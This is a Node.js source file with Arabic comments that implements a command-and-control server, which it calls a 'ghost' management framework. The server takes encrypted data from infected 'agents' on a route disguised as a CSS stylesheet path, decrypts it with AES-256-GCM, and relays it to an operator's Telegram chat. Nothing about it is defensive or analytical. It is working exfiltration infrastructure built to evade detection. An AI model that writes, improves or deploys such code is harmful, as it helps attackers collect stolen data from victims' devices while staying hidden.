// app.js - إطار الإدارة والتحكم الشبح المتكامل (2026)
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const token = process.env.TG_TOKEN;
const chatId = process.env.TG_ID;
const ENCRYPTION_SECRET = process.env.AGENT_SECRET || 'BaseSystemZeroDaySecureKey2026';

if (!token || !chatId) {
    console.error('[-] خطأ: لم يتم ضبط متغيرات البيئة للتوكن أو المعرف بشكل صحيح.');
    process.exit(1);
}

const app = express();
const appBot = new telegramBot(token, { polling: true });

app.use(express.text({ type: '*/*', limit: '50mb' }));

// اشتقاق مفتاح التشفير العسكري في الذاكرة العشوائية لمنع تتبعه
const CRYPTO_KEY = crypto.scryptSync(ENCRYPTION_SECRET, 'system_salt', 32);

// --- موديول فك التشفير المتقدم (AES-256-GCM) ---
function decryptPayload(base64String) {
    try {
        const rawJson = Buffer.from(base64String, 'base64').toString('utf8');
        const packet = JSON.parse(rawJson);
        const decipher = crypto.createDecipheriv('aes-256-gcm', CRYPTO_KEY, Buffer.from(packet.v, 'hex'));
        decipher.setAuthTag(Buffer.from(packet.g, 'hex'));
        let decrypted = decipher.update(packet.d, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        return null;
    }
}

// --- مسار التمويه الشبكي المستقر المتوافق مع Render ---
app.post('/assets/web/style-min.css', async (req, res) => {
    try {
        const syncMode = req.headers['x-sync-mode'] || 'generic';
        const agentModel = req.headers['x-agent-model'] || 'Unknown-Device';

        const decryptedRaw = decryptPayload(req.body);
        if (!decryptedRaw) return res.sendStatus(404);

        const payload = JSON.parse(decryptedRaw);

        let telegramMessage = `📥 <b>بيانات واردة من: ${agentModel}</b>\n`;
        telegramMessage += `📊 النوع: <code>${syncMode}</code>\n\n`;
        telegramMessage += `<pre>${JSON.stringify(payload, null, 2)}</pre>`;

        await appBot.sendMessage(chatId, telegramMessage, { parse_mode: 'HTML' });
        res.status(200).send('/* Synchronized */');
    } catch (err) {
        res.sendStatus(200); 
    }
});

app.get('/', (req, res) => res.status(200).send('Service Active'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] خادم الإدارة الشبح يعمل الآن على المنفذ: ${PORT}`);
});
